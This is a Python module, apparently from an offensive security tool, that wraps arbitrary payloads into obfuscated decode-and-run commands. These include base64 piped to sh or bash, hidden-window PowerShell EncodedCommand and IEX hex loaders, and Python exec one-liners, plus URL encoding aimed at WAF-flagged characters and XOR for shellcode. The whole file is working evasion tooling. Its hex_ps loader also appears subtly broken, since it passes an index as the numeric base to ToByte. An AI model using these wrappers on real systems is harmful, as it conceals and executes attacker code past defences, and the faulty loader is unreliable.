"""
Payload encoders and command wrappers.

The old version of this module only produced encoded *strings* —
useful if you know how to wrap them, useless if you don't. This
version adds the wrappers: b64_sh() returns the whole command that
decodes and runs the payload, not just the base64 blob.

Naming:
  encode()      legacy, returns just the encoded string
  b64_sh()      full "echo <b64> | base64 -d | sh" wrapper
  b64_ps()      PowerShell -EncodedCommand wrapper
  b64_python()  Python base64-decode-and-exec wrapper
  hex_sh()      printf-based hex wrapper for /bin/sh
  url_encode()  URL-encode with a wide "significant" character set
  url_double()  double URL-encode
  xor_bytes()   XOR with a repeating key (returns hex string)
"""

import base64
import binascii
import urllib.parse


# =====================================================================
# Legacy shim
# =====================================================================

def encode(payload: str, method: str):
    """Legacy API. Returns only the encoded string.

    Prefer the specific functions (b64_sh, b64_ps, etc.) — they
    produce runnable commands, not just encoded blobs.
    """
    if method == "base64":
        return base64.b64encode(payload.encode()).decode()
    if method == "hex":
        return payload.encode().hex()
    if method == "url":
        return urllib.parse.quote(payload, safe="")
    return payload


# =====================================================================
# Base64 wrappers
# =====================================================================

def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def b64_sh(payload: str) -> str:
    """Encode payload and wrap in a POSIX sh decoder chain."""
    encoded = _b64(payload)
    return f"echo {encoded} | base64 -d | sh"


def b64_bash(payload: str) -> str:
    """Same as b64_sh but explicitly bash."""
    encoded = _b64(payload)
    return f"echo {encoded} | base64 -d | bash"


def b64_ps(payload: str) -> str:
    """Produce a PowerShell -EncodedCommand invocation.

    PowerShell expects UTF-16LE before base64 encoding, not UTF-8.
    This is a common bug in homegrown payload encoders.
    """
    utf16 = payload.encode("utf-16-le")
    encoded = base64.b64encode(utf16).decode()
    return f"powershell -nop -w hidden -EncodedCommand {encoded}"


def b64_python(payload: str) -> str:
    """Python base64-decode-and-exec one-liner."""
    encoded = _b64(payload)
    return (f"python3 -c \"import base64;"
            f"exec(base64.b64decode('{encoded}').decode())\"")


# =====================================================================
# Hex wrappers
# =====================================================================

def hex_sh(payload: str) -> str:
    """POSIX sh wrapper using printf with \\xNN escapes.

    Note: POSIX printf does NOT understand \\x escapes — you need
    a shell whose printf does (bash, ksh, zsh). If the target only
    has a minimal sh (dash, busybox), use b64_sh instead.
    """
    escaped = "".join(f"\\x{ord(c):02x}" for c in payload)
    return f"printf '{escaped}' | sh"


def hex_ps(payload: str) -> str:
    """PowerShell wrapper: decode hex to bytes, then invoke."""
    hexed = payload.encode("utf-16-le").hex()
    return (f"powershell -nop -w hidden -c \""
            f"$b=[byte[]]::new({len(hexed)//2});"
            f"for($i=0;$i -lt {len(hexed)};$i+=2){{"
            f"$b[$i/2]=[Convert]::ToByte('{hexed}',$i);}};"
            f"IEX([Text.Encoding]::Unicode.GetString($b))\"")


# =====================================================================
# URL encoding
# =====================================================================

# Characters an HTTP layer will decode, plus chars a WAF typically
# flags. We encode this set and leave the rest alone.
_URL_SIGNIFICANT = set("<>\"'();{}\\|^`[]%?&#=+/ ,\t\n\r")


def url_encode(payload: str, encode_all: bool = False) -> str:
    """URL-encode. By default only significant characters are encoded."""
    if encode_all:
        return urllib.parse.quote(payload, safe="")
    out = []
    for ch in payload:
        if ch in _URL_SIGNIFICANT:
            out.append(urllib.parse.quote(ch, safe=""))
        else:
            out.append(ch)
    return "".join(out)


def url_double(payload: str) -> str:
    """Double URL-encode (every character)."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


# =====================================================================
# XOR
# =====================================================================

def xor_bytes(payload: str, key: str) -> str:
    """XOR the payload bytes with a repeating key. Returns hex.

    The hex string still needs a decoder stub to run. This function
    just does the transformation; the caller decides how to wrap it.
    """
    if not key:
        return payload.encode().hex()
    key_bytes = key.encode()
    data = payload.encode()
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key_bytes[i % len(key_bytes)])
    return binascii.hexlify(bytes(out)).decode()


def xor_shellcode(payload_hex: str, key_hex: str) -> str:
    """XOR raw shellcode (hex-in, hex-out) with a repeating hex key."""
    data = binascii.unhexlify(payload_hex)
    key = binascii.unhexlify(key_hex)
    if not key:
        return payload_hex
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)])
    return binascii.hexlify(bytes(out)).decode()


# =====================================================================
# Convenience
# =====================================================================

def wrap(payload: str, method: str) -> str:
    """Apply a named wrapper. This is what the CLI should call.

    Methods: b64sh, b64bash, b64ps, b64py, hexsh, hexps, url, urldouble
    """
    method = method.lower()
    if method == "b64sh":
        return b64_sh(payload)
    if method == "b64bash":
        return b64_bash(payload)
    if method == "b64ps":
        return b64_ps(payload)
    if method == "b64py":
        return b64_python(payload)
    if method == "hexsh":
        return hex_sh(payload)
    if method == "hexps":
        return hex_ps(payload)
    if method == "url":
        return url_encode(payload)
    if method == "urldouble":
        return url_double(payload)
    return payload